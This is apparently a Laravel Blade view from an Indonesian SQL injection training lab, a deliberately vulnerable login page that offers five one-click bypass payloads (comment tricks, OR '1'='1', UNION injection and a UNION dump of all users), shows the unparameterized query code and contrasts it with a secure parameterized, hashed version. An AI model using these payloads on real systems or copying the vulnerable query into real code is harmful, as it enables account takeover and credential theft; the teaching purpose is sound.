{{-- ============================================ --}}
{{-- SQLI LAB: Vulnerable Login Demo --}}
{{-- Authentication Bypass dengan SQL Injection --}}
{{-- ============================================ --}}

@extends('layouts.app')

@section('title', 'Login Bypass - SQL Injection Demo')

@section('content')
<div class="container py-4">
    <div class="row justify-content-center">
        <div class="col-lg-10">

            {{-- Breadcrumb --}}
            <nav aria-label="breadcrumb">
                <ol class="breadcrumb">
                    <li class="breadcrumb-item"><a href="{{ route('sqli-lab.index') }}">SQLi Lab</a></li>
                    <li class="breadcrumb-item active">Login Bypass</li>
                </ol>
            </nav>

            {{-- Warning Banner --}}
            <div class="alert alert-danger">
                <div class="d-flex align-items-center">
                    <i class="bi bi-exclamation-octagon-fill fs-2 me-3"></i>
                    <div>
                        <h5 class="alert-heading mb-1">AUTHENTICATION BYPASS DEMO!</h5>
                        <p class="mb-0 small">
                            Form login ini <strong>SENGAJA VULNERABLE</strong> untuk menunjukkan
                            authentication bypass via SQL Injection. Jangan gunakan pattern ini!
                        </p>
                    </div>
                </div>
            </div>

            {{-- Header --}}
            <div class="text-center mb-4">
                <h1 class="display-6 fw-bold">
                    <i class="bi bi-unlock text-warning"></i>
                    Authentication Bypass Demo
                </h1>
                <p class="text-muted">
                    Login tanpa tahu password menggunakan SQL Injection
                </p>
            </div>

            <div class="row">
                {{-- Login Form --}}
                <div class="col-md-6">
                    <div class="card border-warning">
                        <div class="card-header bg-warning text-dark">
                            <h5 class="mb-0">
                                <i class="bi bi-key"></i> Login Form (Vulnerable)
                            </h5>
                        </div>
                        <div class="card-body">

                            {{-- Query Results Display --}}
                            {{-- Jika query mengembalikan lebih dari 1 row, tampilkan semua --}}
                            {{-- Ini adalah hasil NATURAL dari query, bukan variabel khusus --}}
                            @if(isset($users) && count($users) > 1)
                            <div class="alert alert-danger">
                                <i class="bi bi-exclamation-triangle-fill"></i>
                                <strong>Query returned {{ count($users) }} rows!</strong>
                                <small class="d-block text-muted">Login normal seharusnya hanya return 1 user.</small>
                                <hr>
                                <div class="table-responsive">
                                    <table class="table table-sm table-bordered mb-0 small">
                                        <thead class="table-dark">
                                            <tr>
                                                <th>#</th>
                                                <th>Username</th>
                                                <th>Password</th>
                                                <th>Email</th>
                                                <th>Role</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            @foreach($users as $index => $row)
                                            <tr>
                                                <td>{{ $index + 1 }}</td>
                                                <td><code>{{ $row->username ?? 'N/A' }}</code></td>
                                                <td><code class="text-danger">{{ $row->password ?? 'N/A' }}</code></td>
                                                <td>{{ $row->email ?? 'N/A' }}</td>
                                                <td>
                                                    @if(isset($row->role))
                                                    <span class="badge bg-{{ $row->role == 'admin' ? 'danger' : 'secondary' }}">{{ $row->role }}</span>
                                                    @else
                                                    N/A
                                                    @endif
                                                </td>
                                            </tr>
                                            @endforeach
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                            @endif

                            {{-- Success Message --}}
                            @if(isset($success) && $success)
                            <div class="alert {{ isset($isBypass) && $isBypass ? 'alert-danger' : 'alert-success' }}">
                                <i class="bi bi-check-circle-fill"></i>
                                <strong>Login Berhasil!</strong>
                                <hr>
                                <p class="mb-0">Welcome, <strong>{{ $user->username ?? 'Unknown' }}</strong>!</p>
                                <p class="mb-0">Email: {{ $user->email ?? 'N/A' }}</p>
                                <p class="mb-0">Role: <span class="badge bg-{{ ($user->role ?? '') == 'admin' ? 'danger' : 'secondary' }}">{{ $user->role ?? 'N/A' }}</span></p>

                                @if(isset($isBypass) && $isBypass)
                                <hr>
                                <div class="text-danger">
                                    <i class="bi bi-exclamation-triangle"></i>
                                    <strong>SQL INJECTION BYPASS DETECTED!</strong><br>
                                    <small>Anda berhasil login tanpa mengetahui password yang sebenarnya!</small>
                                </div>
                                @else
                                <hr>
                                <div class="text-success">
                                    <i class="bi bi-shield-check"></i>
                                    <small>Login normal dengan kredensial yang benar.</small>
                                </div>
                                @endif
                            </div>
                            @endif

                            {{-- Error Message --}}
                            @if(isset($error))
                            <div class="alert alert-danger">
                                <i class="bi bi-x-circle"></i>
                                {{ $error }}
                            </div>
                            @endif

                            {{-- Login Form --}}
                            <form method="POST" action="{{ route('sqli-lab.vulnerable-login-submit') }}">
                                @csrf

                                <div class="mb-3">
                                    <label class="form-label">Username</label>
                                    <input type="text"
                                           name="username"
                                           class="form-control"
                                           value="{{ old('username', $inputUsername ?? '') }}"
                                           placeholder="Masukkan username">
                                </div>

                                <div class="mb-3">
                                    <label class="form-label">Password</label>
                                    <input type="text" {{-- Sengaja type=text untuk demo --}}
                                           name="password"
                                           class="form-control"
                                           value="{{ old('password', $inputPassword ?? '') }}"
                                           placeholder="Masukkan password">
                                    <small class="text-muted">
                                        <i class="bi bi-info-circle"></i>
                                        Sengaja menggunakan type="text" agar bisa lihat injection
                                    </small>
                                </div>

                                <button type="submit" class="btn btn-warning w-100">
                                    <i class="bi bi-box-arrow-in-right"></i> Login
                                </button>
                            </form>

                            {{-- Valid Credentials --}}
                            <div class="mt-4 small">
                                <strong>User tersedia di database:</strong>
                                <ul class="mb-0 mt-1">
                                    <li><code>admin</code> / <code>supersecret123</code></li>
                                    <li><code>user1</code> / <code>password123</code></li>
                                    <li><code>manager</code> / <code>manager456</code></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>

                {{-- Payloads --}}
                <div class="col-md-6">
                    <div class="card h-100">
                        <div class="card-header bg-danger text-white">
                            <h5 class="mb-0">
                                <i class="bi bi-lightning"></i> Bypass Payloads
                            </h5>
                        </div>
                        <div class="card-body">
                            <p class="text-muted small">
                                Coba payload berikut untuk bypass authentication:
                            </p>

                            {{-- Payload 1 --}}
                            <div class="card bg-light mb-3">
                                <div class="card-body py-2">
                                    <h6 class="mb-2">1. Login sebagai admin (comment)</h6>
                                    <button class="btn btn-sm btn-outline-danger mb-1 w-100 text-start login-payload-btn"
                                            data-username="admin'-- " data-password="apapun">
                                        Username: <code>admin'-- </code><br>
                                        Password: <code>(apapun)</code>
                                    </button>
                                    <small class="text-muted">
                                        Query: <code>WHERE username = 'admin'-- ' AND password = '...'</code>
                                    </small>
                                </div>
                            </div>

                            {{-- Payload 2 --}}
                            <div class="card bg-light mb-3">
                                <div class="card-body py-2">
                                    <h6 class="mb-2">2. OR True (login sebagai siapapun)</h6>
                                    <button class="btn btn-sm btn-outline-danger mb-1 w-100 text-start login-payload-btn"
                                            data-username="' OR '1'='1" data-password="' OR '1'='1">
                                        Username: <code>' OR '1'='1</code><br>
                                        Password: <code>' OR '1'='1</code>
                                    </button>
                                    <small class="text-muted">
                                        Kondisi WHERE jadi selalu TRUE
                                    </small>
                                </div>
                            </div>

                            {{-- Payload 3 --}}
                            <div class="card bg-light mb-3">
                                <div class="card-body py-2">
                                    <h6 class="mb-2">3. Login admin dengan hash comment</h6>
                                    <button class="btn btn-sm btn-outline-danger mb-1 w-100 text-start login-payload-btn"
                                            data-username="admin'#" data-password="apapun">
                                        Username: <code>admin'#</code><br>
                                        Password: <code>(apapun)</code>
                                    </button>
                                    <small class="text-muted">
                                        <i class="bi bi-exclamation-circle"></i> # adalah comment di MySQL saja (tidak bekerja di PostgreSQL)
                                    </small>
                                </div>
                            </div>

                            {{-- Payload 4 --}}
                            <div class="card bg-light mb-3">
                                <div class="card-body py-2">
                                    <h6 class="mb-2">4. Union-based (inject fake user)</h6>
                                    <button class="btn btn-sm btn-outline-danger mb-1 w-100 text-start login-payload-btn"
                                            data-username="' UNION SELECT 1, 'hacked', 'x', 'hacked@evil.com', 'superadmin', NOW(), NOW()-- " data-password="x">
                                        Username: <code>' UNION SELECT 1,'hacked','x','...'...</code><br>
                                        Password: <code>x</code>
                                    </button>
                                    <small class="text-muted">
                                        Inject user palsu: id=1, username='hacked', password='x', email, role='superadmin', timestamps
                                    </small>
                                </div>
                            </div>

                            {{-- Payload 5: UNION Extract All Users --}}
                            <div class="card bg-light mb-3">
                                <div class="card-body py-2">
                                    <h6 class="mb-2">5. UNION - Ekstrak Semua User!</h6>
                                    <button class="btn btn-sm btn-outline-danger mb-1 w-100 text-start login-payload-btn"
                                            data-username="' UNION SELECT * FROM sqli_lab_users-- " data-password="x">
                                        Username: <code class="small">' UNION SELECT ... FROM sqli_lab_users--</code><br>
                                        Password: <code>x</code>
                                    </button>
                                    <small class="text-danger">
                                        <i class="bi bi-exclamation-triangle"></i> Bocorkan SEMUA username & password!
                                    </small>
                                </div>
                            </div>

                            {{-- Database Info --}}
                            <div class="alert alert-info small mb-0">
                                <i class="bi bi-info-circle"></i> <strong>Info Database:</strong><br>
                                Tabel <code>sqli_lab_users</code> memiliki 7 kolom:<br>
                                <code>id, username, password, email, role, created_at, updated_at</code><br>
                                <hr class="my-1">
                                <span class="text-muted">• UNION memerlukan jumlah kolom yang sama</span><br>
                                <span class="text-muted">• Password plaintext = kebocoran fatal!</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            {{-- Query Display --}}
            @if(isset($query))
            <div class="card mt-4 border-dark">
                <div class="card-header bg-dark text-white">
                    <h5 class="mb-0">
                        <i class="bi bi-code"></i> Query yang Dieksekusi
                    </h5>
                </div>
                <div class="card-body">
                    <pre class="bg-light p-3 rounded mb-0 small"><code>{{ $query }}</code></pre>
                </div>
            </div>
            @endif

            {{-- Vulnerable Code --}}
            <div class="card mt-4">
                <div class="card-header bg-dark text-white">
                    <h5 class="mb-0">
                        <i class="bi bi-code-slash"></i> Kode Vulnerable
                    </h5>
                </div>
                <div class="card-body">
                    <pre class="bg-dark text-light p-3 rounded"><code><span class="text-secondary">// AUTHENTICATION VULNERABLE!</span>
public function vulnerableLoginSubmit(Request $request)
{
    $username = $request->input('username');
    $password = $request->input('password');

    <span class="text-danger">// VULNERABLE: No parameterization!</span>
    $query = "SELECT * FROM sqli_lab_users
              WHERE username = '<span class="text-danger">{$username}</span>'
              AND password = '<span class="text-danger">{$password}</span>'
              LIMIT 1";

    $users = DB::select($query);

    if (count($users) > 0) {
        <span class="text-warning">// Login berhasil - TANPA VERIFIKASI PASSWORD BENAR!</span>
        return 'Login Success!';
    }
}</code></pre>

                    <div class="alert alert-danger mt-3 mb-0">
                        <strong>Masalah:</strong>
                        <ul class="mb-0">
                            <li>Username dan password langsung di-concatenate ke query</li>
                            <li>Password disimpan plaintext (bukan hash)</li>
                            <li>Tidak ada prepared statement / parameter binding</li>
                        </ul>
                    </div>
                </div>
            </div>

            {{-- Secure Alternative --}}
            <div class="card mt-4">
                <div class="card-header bg-success text-white">
                    <h5 class="mb-0">
                        <i class="bi bi-shield-check"></i> Cara Aman (Best Practice)
                    </h5>
                </div>
                <div class="card-body">
                    <pre class="bg-dark text-light p-3 rounded"><code><span class="text-secondary">// SECURE: Gunakan Laravel Auth atau ini:</span>
public function secureLogin(Request $request)
{
    $request->validate([
        'username' => 'required|string|max:255',
        'password' => 'required|string',
    ]);

    <span class="text-success">// Eloquent: Otomatis parameterized</span>
    $user = User::where('username', $request->username)->first();

    if ($user && <span class="text-success">Hash::check($request->password, $user->password)</span>) {
        Auth::login($user);
        return redirect()->intended('dashboard');
    }

    return back()->withErrors(['login' => 'Invalid credentials']);
}</code></pre>

                    <div class="alert alert-success mt-3 mb-0">
                        <strong>Perbaikan:</strong>
                        <ul class="mb-0">
                            <li>Gunakan Eloquent (otomatis prepared statement)</li>
                            <li>Password di-hash dengan <code>Hash::make()</code></li>
                            <li>Verifikasi dengan <code>Hash::check()</code></li>
                            <li>Atau lebih baik, gunakan <code>Auth::attempt()</code>!</li>
                        </ul>
                    </div>
                </div>
            </div>

            {{-- Navigation --}}
            <div class="d-flex justify-content-between mt-4">
                <a href="{{ route('sqli-lab.vulnerable-search') }}" class="btn btn-outline-danger">
                    <i class="bi bi-arrow-left"></i> Vulnerable Search
                </a>
                <a href="{{ route('sqli-lab.blind-sqli') }}" class="btn btn-danger">
                    Blind SQLi <i class="bi bi-arrow-right"></i>
                </a>
            </div>

        </div>
    </div>
</div>

@push('scripts')
<script>
document.addEventListener('DOMContentLoaded', function() {
    // Handle login payload buttons
    document.querySelectorAll('.login-payload-btn').forEach(function(btn) {
        btn.addEventListener('click', function() {
            var username = this.getAttribute('data-username');
            var password = this.getAttribute('data-password');
            document.querySelector('input[name="username"]').value = username;
            document.querySelector('input[name="password"]').value = password;
        });
    });
});

function fillLogin(username, password) {
    document.querySelector('input[name="username"]').value = username;
    document.querySelector('input[name="password"]').value = password;
}
</script>
@endpush

{{-- Inline script as fallback --}}
<script>
document.addEventListener('DOMContentLoaded', function() {
    // Handle login payload buttons
    document.querySelectorAll('.login-payload-btn').forEach(function(btn) {
        btn.addEventListener('click', function() {
            var username = this.getAttribute('data-username');
            var password = this.getAttribute('data-password');
            document.querySelector('input[name="username"]').value = username;
            document.querySelector('input[name="password"]').value = password;
        });
    });
});

function fillLogin(username, password) {
    document.querySelector('input[name="username"]').value = username;
    document.querySelector('input[name="password"]').value = password;
}
</script>
@endsection
